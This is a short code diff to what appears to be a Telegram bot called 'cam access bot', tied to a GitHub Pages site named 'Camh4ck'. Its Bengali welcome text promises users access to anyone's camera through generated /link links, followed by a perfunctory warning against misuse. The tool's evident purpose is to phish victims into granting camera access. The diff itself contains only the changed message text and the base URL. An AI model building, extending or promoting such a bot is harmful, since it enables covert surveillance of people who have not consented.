@@ -32,7 +32,7 @@ BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"
 def send_welcome(message):
     welcome_text = (
         f"হ্যালো {message.from_user.first_name}!\n"
-        "Welcome to 50/50 bot\n"
+        "Welcome to cam access bot\n\n"
         "এই বোটের সাহায্যে আপনি যে কারো ক্যামেরা এক্সেস করতে পারবেন।\n\n"
         "⚠️ সতর্কবার্তা: কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n"
         "লিঙ্ক তৈরি করতে নিচের /link বাটনে ক্লিক করুন।"
